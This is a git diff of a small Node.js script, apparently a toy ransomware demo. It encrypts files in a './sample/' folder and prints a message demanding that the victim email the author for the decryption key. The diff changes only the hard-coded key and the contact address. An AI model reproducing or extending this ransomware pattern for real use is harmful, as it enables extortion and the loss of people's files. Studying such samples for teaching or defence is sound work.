@@ -8,7 +8,7 @@ const rl = readline.createInterface({
 });
 
 const sample = "./sample/";
-var encryptionKey = "Mango"; 
+var encryptionKey = "Klay"; 
 
 function encryptFiles() {
   fs.readdirSync(sample).forEach((file) => {
@@ -26,7 +26,7 @@ function encryptFiles() {
       }
     );
   });
-  console.log("Files are encrypted. Contact me at dobby@gmail.com for the Decryption key");
+  console.log("Files are encrypted. Contact me at klay@gmail.com for the Decryption key");
 }
 
 function decryptFiles(decryptionKey) {
